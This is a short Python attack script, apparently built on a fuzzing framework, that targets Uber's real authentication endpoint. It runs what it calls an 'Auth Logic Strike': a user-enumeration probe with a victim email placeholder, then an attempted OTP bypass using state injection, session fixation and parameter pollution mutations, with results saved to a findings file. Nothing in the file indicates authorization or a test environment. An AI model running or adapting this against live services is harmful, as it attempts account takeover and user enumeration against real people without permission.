import asyncio
import json
import uuid
import os
from aura.modules.stateful_logic_fuzzer import StatefulLogicFuzzer
from aura.ui.formatter import ZenithFormatter

async def run_auth_strike():
    formatter = ZenithFormatter()
    formatter.banner("Uber Auth Logic Strike")
    
    fuzzer = StatefulLogicFuzzer(base_url="https://auth.uber.com")
    
    # Target: auth.uber.com
    # We focus on the user entry point and the transition to the PIN/OTP stage.
    
    workflow = [
        {
            "id": "init_session",
            "url": "https://auth.uber.com/v2/submit-form",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "x-uber-device": "web",
                "x-uber-client-id": "uber-web-client"
            },
            "json_payload": {
                "answer": {"type": "VERIFY_INPUT_ANSWER", "verifyInputAnswer": {"input": "victim@example.com"}},
                "init": True
            },
            "mutation_types": ["BOLA", "STATE_INJECTION"],
            "description": "Initial login entry point (User Enumeration Vector)"
        },
        {
            "id": "verify_otp_bypass",
            "url": "https://auth.uber.com/v2/submit-form",
            "method": "POST",
            "depends_on": "init_session",
            "headers": {
                "Content-Type": "application/json",
            },
            "json_payload": {
                "answer": {
                    "type": "VERIFY_INPUT_ANSWER",
                    "verifyInputAnswer": {
                        "input": "123456" # Dummy OTP
                    }
                },
                "state": "{{TOKEN}}" # We'll try to inject state from the previous response
            },
            "mutation_types": ["SESSION_FIXATION", "PARAMETER_POLLUTION"],
            "description": "Testing for OTP bypass via state exploitation"
        }
    ]
    
    formatter.phase_banner("Defining Auth Workflow", "Analyzing v2/submit-form state transitions...")
    steps = fuzzer.define_workflow("Uber_Auth_Strike", workflow)
    
    formatter.phase_banner("Executing Auth Logic Strike", "Targeting auth.uber.com...")
    results = await fuzzer.execute_workflow(steps)
    
    # Save findings
    findings = results.findings
            
    if findings:
        formatter.print_findings(findings)
        with open("reports/auth_logic_strike_findings.json", "w") as f:
            json.dump(findings, f, indent=4)
    else:
        print("\n[!] No immediate logic flaws detected in the basic auth flow.")

if __name__ == "__main__":
    asyncio.run(run_auth_strike())
